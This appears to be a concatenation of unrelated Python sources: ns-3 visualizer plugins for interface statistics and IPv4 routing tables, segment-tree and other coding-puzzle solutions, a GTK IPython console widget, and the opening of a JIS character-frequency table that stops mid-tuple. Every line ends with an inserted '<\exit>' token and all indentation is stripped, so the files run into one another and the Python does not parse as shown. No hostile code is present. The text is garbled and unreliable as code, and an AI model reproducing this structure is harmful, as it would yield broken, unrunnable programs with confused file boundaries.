add_column("Rx pkt/1s", self.COLUMN_RX_PACKET_RATE)<\exit>
add_column("Rx bit/1s", self.COLUMN_RX_BIT_RATE)<\exit>
self.visualizer.add_information_window(self)<\exit>
self.win.show()<\exit>
def _response_cb(self, win, response):<\exit>
self.win.destroy()<\exit>
self.visualizer.remove_information_window(self)<\exit>
def update(self):<\exit>
node = ns.network.NodeList.GetNode(self.node_index)<\exit>
stats_list = self.statistics_collector.get_interface_statistics(self.node_index)<\exit>
self.table_model.clear()<\exit>
for iface, stats in enumerate(stats_list):<\exit>
tree_iter = self.table_model.append()<\exit>
netdevice = node.GetDevice(iface)<\exit>
interface_name = ns.core.Names.FindName(netdevice)<\exit>
if not interface_name:<\exit>
interface_name = "(interface %i)" % iface<\exit>
self.table_model.set(tree_iter,<\exit>
self.COLUMN_INTERFACE, interface_name,<\exit>
self.COLUMN_TX_PACKETS, str(stats.txPackets),<\exit>
self.COLUMN_TX_BYTES, str(stats.txBytes),<\exit>
self.COLUMN_TX_PACKET_RATE, str(stats.txPacketRate),<\exit>
self.COLUMN_TX_BIT_RATE, str(stats.txBitRate),<\exit>
self.COLUMN_RX_PACKETS, str(stats.rxPackets),<\exit>
self.COLUMN_RX_BYTES, str(stats.rxBytes),<\exit>
self.COLUMN_RX_PACKET_RATE, str(stats.rxPacketRate),<\exit>
self.COLUMN_RX_BIT_RATE, str(stats.rxBitRate)<\exit>
)<\exit>
def populate_node_menu(viz, node, menu, statistics_collector):<\exit>
menu_item = gtk.MenuItem("Show Interface Statistics")<\exit>
menu_item.show()<\exit>
def _show_it(dummy_menu_item):<\exit>
ShowInterfaceStatistics(viz, node.node_index, statistics_collector)<\exit>
menu_item.connect("activate", _show_it)<\exit>
menu.add(menu_item)<\exit>
def register(viz):<\exit>
statistics_collector = StatisticsCollector(viz)<\exit>
viz.connect("populate-node-menu", populate_node_menu, statistics_collector)<\exit>
viz.connect("simulation-periodic-update", statistics_collector.simulation_periodic_update)<\exit>
class Solution(object):<\exit>
def rerange(self, A):<\exit>
n = len(A)<\exit>
pos_cnt = len(filter(lambda x: x > 0, A))<\exit>
pos_expt = True if pos_cnt*2 > n else False<\exit>
neg = 0<\exit>
pos = 0<\exit>
for i in xrange(n):<\exit>
while neg < n and A[neg] > 0: neg += 1<\exit>
while pos < n and A[pos] < 0: pos += 1<\exit>
if pos_expt:<\exit>
A[i], A[pos] = A[pos], A[i]<\exit>
else:<\exit>
A[i], A[neg] = A[neg], A[i]<\exit>
if i == neg: neg += 1<\exit>
if i == pos: pos += 1<\exit>
pos_expt = not pos_expt<\exit>
if __name__ == "__main__":<\exit>
A = [-33, -19, 30, 26, 21, -9]<\exit>
Solution().rerange(A)<\exit>
assert A == [-33, 30, -19, 26, -9, 21]<\exit>
import sys<\exit>
DEFAULT = sys.maxint<\exit>
f = lambda x, y: min(x, y)<\exit>
class Node(object):<\exit>
def __init__(self, start, end, m):<\exit>
self.start, self.end, self.m = start, end, m<\exit>
self.left, self.right = None, None<\exit>
class SegmentTree(object):<\exit>
def __init__(self, A):<\exit>
self.A = A<\exit>
self.root = self.build_tree(0, len(self.A))<\exit>
def build_tree(self, s, e):<\exit>
if s >= e:<\exit>
return None<\exit>
if s+1 == e:<\exit>
return Node(s, e, self.A[s])<\exit>
left = self.build_tree(s, (s+e)/2)<\exit>
right = self.build_tree((s+e)/2, e)<\exit>
val = DEFAULT<\exit>
if left: val = f(val, left.m)<\exit>
if right: val = f(val, right.m)<\exit>
root = Node(s, e, val)<\exit>
root.left = left<\exit>
root.right = right<\exit>
return root<\exit>
def query(self, root, s, e):<\exit>
if not root:<\exit>
return DEFAULT<\exit>
if s <= root.start and e >= root.end:<\exit>
return root.m<\exit>
if s >= root.end or e <= root.start:<\exit>
return DEFAULT<\exit>
l = self.query(root.left, s, e)<\exit>
r = self.query(root.right, s, e)<\exit>
return f(l, r)<\exit>
class Solution:<\exit>
def intervalMinNumber(self, A, queries):<\exit>
ret = []<\exit>
tree = SegmentTree(A)<\exit>
for q in queries:<\exit>
ret.append(tree.query(tree.root, q.start, q.end+1))<\exit>
return ret<\exit>
DEFAULT = 0<\exit>
f = lambda x, y: x+y<\exit>
class Node(object):<\exit>
def __init__(self, start, end, m):<\exit>
self.start, self.end, self.m = start, end, m<\exit>
self.left, self.right = None, None<\exit>
class SegmentTree(object):<\exit>
def __init__(self, A):<\exit>
self.A = A<\exit>
self.root = self.build_tree(0, len(self.A))<\exit>
def build_tree(self, s, e):<\exit>
if s >= e:<\exit>
return None<\exit>
if s+1 == e:<\exit>
return Node(s, e, self.A[s])<\exit>
left = self.build_tree(s, (s+e)/2)<\exit>
right = self.build_tree((s+e)/2, e)<\exit>
val = DEFAULT<\exit>
if left: val = f(val, left.m)<\exit>
if right: val = f(val, right.m)<\exit>
root = Node(s, e, val)<\exit>
root.left = left<\exit>
root.right = right<\exit>
return root<\exit>
def query(self, root, s, e):<\exit>
if not root:<\exit>
return DEFAULT<\exit>
if s <= root.start and e >= root.end:<\exit>
return root.m<\exit>
if s >= root.end or e <= root.start:<\exit>
return DEFAULT<\exit>
l = self.query(root.left, s, e)<\exit>
r = self.query(root.right, s, e)<\exit>
return f(l, r)<\exit>
def modify(self, root, idx, val):<\exit>
if not root or idx >= root.end or idx < root.start:<\exit>
return<\exit>
if idx == root.start and idx == root.end-1:<\exit>
root.m = val<\exit>
self.A[idx] = val<\exit>
return<\exit>
self.modify(root.left, idx, val)<\exit>
self.modify(root.right, idx, val)<\exit>
val = DEFAULT<\exit>
if root.left: val = f(val, root.left.m)<\exit>
if root.right: val = f(val, root.right.m)<\exit>
root.m = val<\exit>
class Solution:<\exit>
def __init__(self, A):<\exit>
self.tree = SegmentTree(A)<\exit>
def query(self, start, end):<\exit>
return self.tree.query(self.tree.root, start, end+1)<\exit>
def modify(self, index, value):<\exit>
self.tree.modify(self.tree.root, index, value)<\exit>
DEFAULT = 0<\exit>
f = lambda x, y: x+y<\exit>
class Node(object):<\exit>
def __init__(self, start, end, m):<\exit>
self.start, self.end, self.m = start, end, m<\exit>
self.left, self.right = None, None<\exit>
class SegmentTree(object):<\exit>
def __init__(self, A):<\exit>
self.A = A<\exit>
self.root = self.build_tree(0, len(self.A))<\exit>
def build_tree(self, s, e):<\exit>
if s >= e:<\exit>
return None<\exit>
if s+1 == e:<\exit>
return Node(s, e, self.A[s])<\exit>
left = self.build_tree(s, (s+e)/2)<\exit>
right = self.build_tree((s+e)/2, e)<\exit>
val = DEFAULT<\exit>
if left: val = f(val, left.m)<\exit>
if right: val = f(val, right.m)<\exit>
root = Node(s, e, val)<\exit>
root.left = left<\exit>
root.right = right<\exit>
return root<\exit>
def query(self, root, s, e):<\exit>
if not root:<\exit>
return DEFAULT<\exit>
if s <= root.start and e >= root.end:<\exit>
return root.m<\exit>
if s >= root.end or e <= root.start:<\exit>
return DEFAULT<\exit>
l = self.query(root.left, s, e)<\exit>
r = self.query(root.right, s, e)<\exit>
return f(l, r)<\exit>
class Solution:<\exit>
def intervalSum(self, A, queries):<\exit>
ret = []<\exit>
tree = SegmentTree(A)<\exit>
for q in queries:<\exit>
ret.append(tree.query(tree.root, q.start, q.end+1))<\exit>
return ret<\exit>
import sys<\exit>
class IOStreamer(object):<\exit>
@staticmethod<\exit>
def stdinlines():<\exit>
for line in sys.stdin.readlines():<\exit>
yield line.strip()<\exit>
import gtk<\exit>
import ns.core<\exit>
import ns.network<\exit>
import ns.internet<\exit>
from visualizer.base import InformationWindow<\exit>
class ShowIpv4RoutingTable(InformationWindow):<\exit>
(<\exit>
COLUMN_DESTINATION,<\exit>
COLUMN_NEXT_HOP,<\exit>
COLUMN_INTERFACE,<\exit>
COLUMN_TYPE,<\exit>
COLUMN_PRIO<\exit>
) = range(5)<\exit>
def __init__(self, visualizer, node_index):<\exit>
InformationWindow.__init__(self)<\exit>
self.win = gtk.Dialog(parent=visualizer.window,<\exit>
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,<\exit>
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))<\exit>
self.win.connect("response", self._response_cb)<\exit>
self.win.set_title("IPv4 routing table for node %i" % node_index)<\exit>
self.visualizer = visualizer<\exit>
self.node_index = node_index<\exit>
self.table_model = gtk.ListStore(str, str, str, str, int)<\exit>
treeview = gtk.TreeView(self.table_model)<\exit>
treeview.show()<\exit>
sw = gtk.ScrolledWindow()<\exit>
sw.set_properties(hscrollbar_policy=gtk.POLICY_AUTOMATIC,<\exit>
vscrollbar_policy=gtk.POLICY_AUTOMATIC)<\exit>
sw.show()<\exit>
sw.add(treeview)<\exit>
self.win.vbox.add(sw)<\exit>
self.win.set_default_size(600, 300)<\exit>
column = gtk.TreeViewColumn('Destination', gtk.CellRendererText(),<\exit>
text=self.COLUMN_DESTINATION)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Next hop', gtk.CellRendererText(),<\exit>
text=self.COLUMN_NEXT_HOP)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Interface', gtk.CellRendererText(),<\exit>
text=self.COLUMN_INTERFACE)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Type', gtk.CellRendererText(),<\exit>
text=self.COLUMN_TYPE)<\exit>
treeview.append_column(column)<\exit>
column = gtk.TreeViewColumn('Prio', gtk.CellRendererText(),<\exit>
text=self.COLUMN_PRIO)<\exit>
treeview.append_column(column)<\exit>
self.visualizer.add_information_window(self)<\exit>
self.win.show()<\exit>
def _response_cb(self, win, response):<\exit>
self.win.destroy()<\exit>
self.visualizer.remove_information_window(self)<\exit>
def update(self):<\exit>
node = ns.network.NodeList.GetNode(self.node_index)<\exit>
ipv4 = node.GetObject(ns.internet.Ipv4.GetTypeId())<\exit>
routing = ipv4.GetRoutingProtocol()<\exit>
if routing is None:<\exit>
return<\exit>
routing_protocols = []<\exit>
if isinstance(routing, ns.internet.Ipv4StaticRouting):<\exit>
ipv4_routing = routing_protocols.append((routing, "static", 0))<\exit>
elif isinstance(routing, ns.internet.Ipv4ListRouting):<\exit>
list_routing = routing<\exit>
for rI in range(list_routing.GetNRoutingProtocols()):<\exit>
routing, prio = list_routing.GetRoutingProtocol(rI)<\exit>
if isinstance(routing, ns.internet.Ipv4StaticRouting):<\exit>
routing_protocols.append((routing, "static", prio))<\exit>
elif isinstance(routing, ns.internet.Ipv4GlobalRouting):<\exit>
routing_protocols.append((routing, "global", prio))<\exit>
if not routing_protocols:<\exit>
return<\exit>
self.table_model.clear()<\exit>
for route_proto, type_string, prio in routing_protocols:<\exit>
for routeI in range(route_proto.GetNRoutes()):<\exit>
route = route_proto.GetRoute(routeI)<\exit>
tree_iter = self.table_model.append()<\exit>
netdevice = ipv4.GetNetDevice(route.GetInterface())<\exit>
if netdevice is None:<\exit>
interface_name = 'lo'<\exit>
else:<\exit>
interface_name = ns.core.Names.FindName(netdevice)<\exit>
if not interface_name:<\exit>
interface_name = "(interface %i)" % route.GetInterface()<\exit>
self.table_model.set(tree_iter,<\exit>
self.COLUMN_DESTINATION, str(route.GetDest()),<\exit>
self.COLUMN_NEXT_HOP, str(route.GetGateway()),<\exit>
self.COLUMN_INTERFACE, interface_name,<\exit>
self.COLUMN_TYPE, type_string,<\exit>
self.COLUMN_PRIO, prio)<\exit>
def populate_node_menu(viz, node, menu):<\exit>
menu_item = gtk.MenuItem("Show IPv4 Routing Table")<\exit>
menu_item.show()<\exit>
def _show_ipv4_routing_table(dummy_menu_item):<\exit>
ShowIpv4RoutingTable(viz, node.node_index)<\exit>
menu_item.connect("activate", _show_ipv4_routing_table)<\exit>
menu.add(menu_item)<\exit>
def register(viz):<\exit>
viz.connect("populate-node-menu", populate_node_menu)<\exit>
%config IPCompleter.greedy=True<\exit>
import gtk<\exit>
import re<\exit>
import sys<\exit>
import os<\exit>
import pango<\exit>
from StringIO import StringIO<\exit>
import IPython<\exit>
ansi_colors =  {'0;30': 'Black',<\exit>
'0;31': 'Red',<\exit>
'0;32': 'Green',<\exit>
'0;33': 'Brown',<\exit>
'0;34': 'Blue',<\exit>
'0;35': 'Purple',<\exit>
'0;36': 'Cyan',<\exit>
'0;37': 'LightGray',<\exit>
'1;30': 'DarkGray',<\exit>
'1;31': 'DarkRed',<\exit>
'1;32': 'SeaGreen',<\exit>
'1;33': 'Yellow',<\exit>
'1;34': 'LightBlue',<\exit>
'1;35': 'MediumPurple',<\exit>
'1;36': 'LightCyan',<\exit>
'1;37': 'White'}<\exit>
class IterableIPShell:<\exit>
def __init__(self,argv=None,user_ns=None,user_global_ns=None,<\exit>
cin=None, cout=None,cerr=None, input_func=None):<\exit>
if input_func:<\exit>
IPython.iplib.raw_input_original = input_func<\exit>
if cin:<\exit>
IPython.Shell.Term.cin = cin<\exit>
if cout:<\exit>
IPython.Shell.Term.cout = cout<\exit>
if cerr:<\exit>
IPython.Shell.Term.cerr = cerr<\exit>
if argv is None:<\exit>
argv=[]<\exit>
IPython.iplib.raw_input = lambda x: None<\exit>
self.term = IPython.genutils.IOTerm(cin=cin, cout=cout, cerr=cerr)<\exit>
os.environ['TERM'] = 'dumb'<\exit>
excepthook = sys.excepthook<\exit>
self.IP = IPython.Shell.make_IPython(argv,user_ns=user_ns,<\exit>
user_global_ns=user_global_ns,<\exit>
embedded=True,<\exit>
shell_class=IPython.Shell.InteractiveShell)<\exit>
self.IP.system = lambda cmd: self.shell(self.IP.var_expand(cmd),<\exit>
header='IPython system call: ',<\exit>
verbose=self.IP.rc.system_verbose)<\exit>
sys.excepthook = excepthook<\exit>
self.iter_more = 0<\exit>
self.history_level = 0<\exit>
self.complete_sep =  re.compile('[\s\{\}\[\]\(\)]')<\exit>
def execute(self):<\exit>
self.history_level = 0<\exit>
orig_stdout = sys.stdout<\exit>
sys.stdout = IPython.Shell.Term.cout<\exit>
try:<\exit>
line = self.IP.raw_input(None, self.iter_more)<\exit>
if self.IP.autoindent:<\exit>
self.IP.readline_startup_hook(None)<\exit>
except KeyboardInterrupt:<\exit>
self.IP.write('\nKeyboardInterrupt\n')<\exit>
self.IP.resetbuffer()<\exit>
self.IP.outputcache.prompt_count -= 1<\exit>
if self.IP.autoindent:<\exit>
self.IP.indent_current_nsp = 0<\exit>
self.iter_more = 0<\exit>
except:<\exit>
self.IP.showtraceback()<\exit>
else:<\exit>
self.iter_more = self.IP.push(line)<\exit>
if (self.IP.SyntaxTB.last_syntax_error and<\exit>
self.IP.rc.autoedit_syntax):<\exit>
self.IP.edit_syntax_error()<\exit>
if self.iter_more:<\exit>
self.prompt = str(self.IP.outputcache.prompt2).strip()<\exit>
if self.IP.autoindent:<\exit>
self.IP.readline_startup_hook(self.IP.pre_readline)<\exit>
else:<\exit>
self.prompt = str(self.IP.outputcache.prompt1).strip()<\exit>
sys.stdout = orig_stdout<\exit>
def historyBack(self):<\exit>
self.history_level -= 1<\exit>
return self._getHistory()<\exit>
def historyForward(self):<\exit>
self.history_level += 1<\exit>
return self._getHistory()<\exit>
def _getHistory(self):<\exit>
try:<\exit>
rv = self.IP.user_ns['In'][self.history_level].strip('\n')<\exit>
except IndexError:<\exit>
self.history_level = 0<\exit>
rv = ''<\exit>
return rv<\exit>
def updateNamespace(self, ns_dict):<\exit>
self.IP.user_ns.update(ns_dict)<\exit>
def complete(self, line):<\exit>
split_line = self.complete_sep.split(line)<\exit>
possibilities = self.IP.complete(split_line[-1])<\exit>
if possibilities:<\exit>
common_prefix = reduce(self._commonPrefix, possibilities)<\exit>
completed = line[:-len(split_line[-1])]+common_prefix<\exit>
else:<\exit>
completed = line<\exit>
return completed, possibilities<\exit>
def _commonPrefix(self, str1, str2):<\exit>
for i in range(len(str1)):<\exit>
if not str2.startswith(str1[:i+1]):<\exit>
return str1[:i]<\exit>
return str1<\exit>
def shell(self, cmd,verbose=0,debug=0,header=''):<\exit>
stat = 0<\exit>
if verbose or debug: print header+cmd<\exit>
if not debug:<\exit>
input, output = os.popen4(cmd)<\exit>
print output.read()<\exit>
output.close()<\exit>
input.close()<\exit>
class ConsoleView(gtk.TextView):<\exit>
def __init__(self):<\exit>
gtk.TextView.__init__(self)<\exit>
self.modify_font(pango.FontDescription('Mono'))<\exit>
self.set_cursor_visible(True)<\exit>
self.text_buffer = self.get_buffer()<\exit>
self.mark = self.text_buffer.create_mark('scroll_mark',<\exit>
self.text_buffer.get_end_iter(),<\exit>
False)<\exit>
for code in ansi_colors:<\exit>
self.text_buffer.create_tag(code,<\exit>
foreground=ansi_colors[code],<\exit>
weight=700)<\exit>
self.text_buffer.create_tag('0')<\exit>
self.text_buffer.create_tag('notouch', editable=False)<\exit>
self.color_pat = re.compile('\x01?\x1b\[(.*?)m\x02?')<\exit>
self.line_start = \<\exit>
self.text_buffer.create_mark('line_start',<\exit>
self.text_buffer.get_end_iter(), True<\exit>
)<\exit>
self.connect('key-press-event', self._onKeypress)<\exit>
self.last_cursor_pos = 0<\exit>
def write(self, text, editable=False):<\exit>
segments = self.color_pat.split(text)<\exit>
segment = segments.pop(0)<\exit>
start_mark = self.text_buffer.create_mark(None,<\exit>
self.text_buffer.get_end_iter(),<\exit>
True)<\exit>
self.text_buffer.insert(self.text_buffer.get_end_iter(), segment)<\exit>
if segments:<\exit>
ansi_tags = self.color_pat.findall(text)<\exit>
for tag in ansi_tags:<\exit>
i = segments.index(tag)<\exit>
self.text_buffer.insert_with_tags_by_name(self.text_buffer.get_end_iter(),<\exit>
segments[i+1], tag)<\exit>
segments.pop(i)<\exit>
if not editable:<\exit>
self.text_buffer.apply_tag_by_name('notouch',<\exit>
self.text_buffer.get_iter_at_mark(start_mark),<\exit>
self.text_buffer.get_end_iter())<\exit>
self.text_buffer.delete_mark(start_mark)<\exit>
self.scroll_mark_onscreen(self.mark)<\exit>
def showPrompt(self, prompt):<\exit>
self.write(prompt)<\exit>
self.text_buffer.move_mark(self.line_start,self.text_buffer.get_end_iter())<\exit>
def changeLine(self, text):<\exit>
iter = self.text_buffer.get_iter_at_mark(self.line_start)<\exit>
iter.forward_to_line_end()<\exit>
self.text_buffer.delete(self.text_buffer.get_iter_at_mark(self.line_start), iter)<\exit>
self.write(text, True)<\exit>
def getCurrentLine(self):<\exit>
rv = self.text_buffer.get_slice(self.text_buffer.get_iter_at_mark(self.line_start),<\exit>
self.text_buffer.get_end_iter(), False)<\exit>
return rv<\exit>
def showReturned(self, text):<\exit>
iter = self.text_buffer.get_iter_at_mark(self.line_start)<\exit>
iter.forward_to_line_end()<\exit>
self.text_buffer.apply_tag_by_name('notouch',<\exit>
self.text_buffer.get_iter_at_mark(self.line_start),<\exit>
iter)<\exit>
self.write('\n'+text)<\exit>
if text:<\exit>
self.write('\n')<\exit>
self.showPrompt(self.prompt)<\exit>
self.text_buffer.move_mark(self.line_start,self.text_buffer.get_end_iter())<\exit>
self.text_buffer.place_cursor(self.text_buffer.get_end_iter())<\exit>
def _onKeypress(self, obj, event):<\exit>
if not event.string:<\exit>
return<\exit>
insert_mark = self.text_buffer.get_insert()<\exit>
insert_iter = self.text_buffer.get_iter_at_mark(insert_mark)<\exit>
selection_mark = self.text_buffer.get_selection_bound()<\exit>
selection_iter = self.text_buffer.get_iter_at_mark(selection_mark)<\exit>
start_iter = self.text_buffer.get_iter_at_mark(self.line_start)<\exit>
if start_iter.compare(insert_iter) <= 0 and \<\exit>
start_iter.compare(selection_iter) <= 0:<\exit>
return<\exit>
elif start_iter.compare(insert_iter) > 0 and \<\exit>
start_iter.compare(selection_iter) > 0:<\exit>
self.text_buffer.place_cursor(start_iter)<\exit>
elif insert_iter.compare(selection_iter) < 0:<\exit>
self.text_buffer.move_mark(insert_mark, start_iter)<\exit>
elif insert_iter.compare(selection_iter) > 0:<\exit>
self.text_buffer.move_mark(selection_mark, start_iter)<\exit>
class IPythonView(ConsoleView, IterableIPShell):<\exit>
def __init__(self):<\exit>
ConsoleView.__init__(self)<\exit>
self.cout = StringIO()<\exit>
IterableIPShell.__init__(self, cout=self.cout,cerr=self.cout,<\exit>
input_func=self.raw_input)<\exit>
self.connect('key_press_event', self.keyPress)<\exit>
self.execute()<\exit>
self.cout.truncate(0)<\exit>
self.showPrompt(self.prompt)<\exit>
self.interrupt = False<\exit>
def raw_input(self, prompt=''):<\exit>
if self.interrupt:<\exit>
self.interrupt = False<\exit>
raise KeyboardInterrupt<\exit>
return self.getCurrentLine()<\exit>
def keyPress(self, widget, event):<\exit>
if event.state & gtk.gdk.CONTROL_MASK and event.keyval == 99:<\exit>
self.interrupt = True<\exit>
self._processLine()<\exit>
return True<\exit>
elif event.keyval == gtk.keysyms.Return:<\exit>
self._processLine()<\exit>
return True<\exit>
elif event.keyval == gtk.keysyms.Up:<\exit>
self.changeLine(self.historyBack())<\exit>
return True<\exit>
elif event.keyval == gtk.keysyms.Down:<\exit>
self.changeLine(self.historyForward())<\exit>
return True<\exit>
elif event.keyval == gtk.keysyms.Tab:<\exit>
if not self.getCurrentLine().strip():<\exit>
return False<\exit>
completed, possibilities = self.complete(self.getCurrentLine())<\exit>
if len(possibilities) > 1:<\exit>
slice = self.getCurrentLine()<\exit>
self.write('\n')<\exit>
for symbol in possibilities:<\exit>
self.write(symbol+'\n')<\exit>
self.showPrompt(self.prompt)<\exit>
self.changeLine(completed or slice)<\exit>
return True<\exit>
def _processLine(self):<\exit>
self.history_pos = 0<\exit>
self.execute()<\exit>
rv = self.cout.getvalue()<\exit>
if rv: rv = rv.strip('\n')<\exit>
self.showReturned(rv)<\exit>
self.cout.truncate(0)<\exit>
fib = lambda n: reduce(lambda x, n: [x[1], x[0] + x[1]], xrange(n), [0, 1])[0]<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
num = int(cipher)<\exit>
n = 0<\exit>
while fib(n) < num:<\exit>
n += 1<\exit>
if fib(n) == num:<\exit>
return "IsFibo"<\exit>
else:<\exit>
return "IsNotFibo"<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
A = cipher<\exit>
n = len(A)<\exit>
idx = sorted(range(n), key=lambda k: A[k][0] + A[k][1])<\exit>
return " ".join(map(lambda x: str(x + 1), idx))<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
n = int(f.readline().strip())<\exit>
cipher = []<\exit>
for i in xrange(n):<\exit>
t = map(int, f.readline().strip().split(' '))<\exit>
cipher.append(tuple(t))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
JIS_TYPICAL_DISTRIBUTION_RATIO = 3.0<\exit>
JIS_TABLE_SIZE = 4368<\exit>
JISCharToFreqOrder = (<\exit>
40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510,<\exit>
3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661,<\exit>
1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041,<\exit>
2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305,<\exit>
2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928,<\exit>
5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375,<\exit>
1691,3297,4306,4307,4611, 452,3376,1182,2713,3688,3069,4308,5083,5084,5085,5086,<\exit>
5087,5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102,<\exit>
5103,5104,5105,5106,5107,5108,5109,5110,5111,5112,4097,5113,5114,5115,5116,5117,<\exit>
5118,5119,5120,5121,5122,5123,5124,5125,5126,5127,5128,5129,5130,5131,5132,5133,<\exit>
5134,5135,5136,5137,5138,5139,5140,5141,5142,5143,5144,5145,5146,5147,5148,5149,<\exit>
5150,5151,5152,4612,5153,5154,5155,5156,5157,5158,5159,5160,5161,5162,5163,5164,<\exit>
5165,5166,5167,5168,5169,5170,5171,5172,5173,5174,5175,1472, 598, 618, 820,1205,<\exit>
1309,1412,1858,1307,1692,5176,5177,5178,5179,5180,5181,5182,1142,1452,1234,1172,<\exit>
1875,2043,2149,1793,1382,2973, 925,2404,1067,1241, 960,1377,2935,1491, 919,1217,<\exit>
1865,2030,1406,1499,2749,4098,5183,5184,5185,5186,5187,5188,2561,4099,3117,1804,<\exit>
2049,3689,4309,3513,1663,5189,3166,3118,3298,1587,1561,3433,5190,3119,1625,2998,<\exit>
3299,4613,1766,3690,2786,4614,5191,5192,5193,5194,2161,  26,3377,   2,3929,  20,<\exit>
3691,  47,4100,  50,  17,  16,  35, 268,  27, 243,  42, 155,  24, 154,  29, 184,<\exit>
4,  91,  14,  92,  53, 396,  33, 289,   9,  37,  64, 620,  21,  39, 321,   5,<\exit>
12,  11,  52,  13,   3, 208, 138,   0,   7,  60, 526, 141, 151,1069, 181, 275,<\exit>
1591,  83, 132,1475, 126, 331, 829,  15,  69, 160,  59,  22, 157,  55,1079, 312,<\exit>
109,  38,  23,  25,  10,  19,  79,5195,  61, 382,1124,   8,  30,5196,5197,5198,<\exit>
5199,5200,5201,5202,5203,5204,5205,5206,  89,  62,  74,  34,2416, 112, 139, 196,<\exit>
271, 149,  84, 607, 131, 765,  46,  88, 153, 683,  76, 874, 101, 258,  57,  80,<\exit>
32, 364, 121,1508, 169,1547,  68, 235, 145,2999,  41, 360,3027,  70,  63,  31,<\exit>
43, 259, 262,1383,  99, 533, 194,  66,  93, 846, 217, 192,  56, 106,  58, 565,<\exit>
280, 272, 311, 256, 146,  82, 308,  71, 100, 128, 214, 655, 110, 261, 104,1140,<\exit>
54,  51,  36,  87,  67,3070, 185,2618,2936,2020,  28,1066,2390,2059,5207,5208,<\exit>
5209,5210,5211,5212,5213,5214,5215,5216,4615,5217,5218,5219,5220,5221,5222,5223,<\exit>
5224,5225,5226,5227,5228,5229,5230,5231,5232,5233,5234,5235,5236,3514,5237,5238,<\exit>
5239,5240,5241,5242,5243,5244,2297,2031,4616,4310,3692,5245,3071,5246,3598,5247,<\exit>
4617,3231,3515,5248,4101,4311,4618,3808,4312,4102,5249,4103,4104,3599,5250,5251,<\exit>
5252,5253,5254,5255,5256,5257,5258,5259,5260,5261,5262,5263,5264,5265,5266,5267,<\exit>
5268,5269,5270,5271,5272,5273,5274,5275,5276,5277,5278,5279,5280,5281,5282,5283,<\exit>
5284,5285,5286,5287,5288,5289,5290,5291,5292,5293,5294,5295,5296,5297,5298,5299,<\exit>
5300,5301,5302,5303,5304,5305,5306,5307,5308,5309,5310,5311,5312,5313,5314,5315,<\exit>
5316,5317,5318,5319,5320,5321,5322,5323,5324,5325,5326,5327,5328,5329,5330,5331,<\exit>
5332,5333,5334,5335,5336,5337,5338,5339,5340,5341,5342,5343,5344,5345,5346,5347,<\exit>
5348,5349,5350,5351,5352,5353,5354,5355,5356,5357,5358,5359,5360,5361,5362,5363,<\exit>
5364,5365,5366,5367,5368,5369,5370,5371,5372,5373,5374,5375,5376,5377,5378,5379,<\exit>
5380,5381, 363, 642,2787,2878,2788,2789,2316,3232,2317,3434,2011, 165,1942,3930,<\exit>
3931,3932,3933,5382,4619,5383,4620,5384,5385,5386,5387,5388,5389,5390,5391,5392,<\exit>
5393,5394,5395,5396,5397,5398,5399,5400,5401,5402,5403,5404,5405,5406,5407,5408,<\exit>
5409,5410,5411,5412,5413,5414,5415,5416,5417,5418,5419,5420,5421,5422,5423,5424,<\exit>
5425,5426,5427,5428,5429,5430,5431,5432,5433,5434,5435,5436,5437,5438,5439,5440,<\exit>
5441,5442,5443,5444,5445,5446,5447,5448,5449,5450,5451,5452,5453,5454,5455,5456,<\exit>
5457,5458,5459,5460,5461,5462,5463,5464,5465,5466,5467,5468,5469,5470,5471,5472,<\exit>
5473,5474,5475,5476,5477,5478,5479,5480,5481,5482,5483,5484,5485,5486,5487,5488,<\exit>
5489,5490,5491,5492,5493,5494,5495,5496,5497,5498,5499,5500,5501,5502,5503,5504,<\exit>
5505,5506,5507,5508,5509,5510,5511,5512,5513,5514,5515,5516,5517,5518,5519,5520,<\exit>
5521,5522,5523,5524,5525,5526,5527,5528,5529,5530,5531,5532,5533,5534,5535,5536,<\exit>
5537,5538,5539,5540,5541,5542,5543,5544,5545,5546,5547,5548,5549,5550,5551,5552,<\exit>
5553,5554,5555,5556,5557,5558,5559,5560,5561,5562,5563,5564,5565,5566,5567,5568,<\exit>
5569,5570,5571,5572,5573,5574,5575,5576,5577,5578,5579,5580,5581,5582,5583,5584,<\exit>
5585,5586,5587,5588,5589,5590,5591,5592,5593,5594,5595,5596,5597,5598,5599,5600,<\exit>
5601,5602,5603,5604,5605,5606,5607,5608,5609,5610,5611,5612,5613,5614,5615,5616,<\exit>
5617,5618,5619,5620,5621,5622,5623,5624,5625,5626,5627,5628,5629,5630,5631,5632,<\exit>
5633,5634,5635,5636,5637,5638,5639,5640,5641,5642,5643,5644,5645,5646,5647,5648,<\exit>
5649,5650,5651,5652,5653,5654,5655,5656,5657,5658,5659,5660,5661,5662,5663,5664,<\exit>
5665,5666,5667,5668,5669,5670,5671,5672,5673,5674,5675,5676,5677,5678,5679,5680,<\exit>
5681,5682,5683,5684,5685,5686,5687,5688,5689,5690,5691,5692,5693,5694,5695,5696,<\exit>
5697,5698,5699,5700,5701,5702,5703,5704,5705,5706,5707,5708,5709,5710,5711,5712,<\exit>
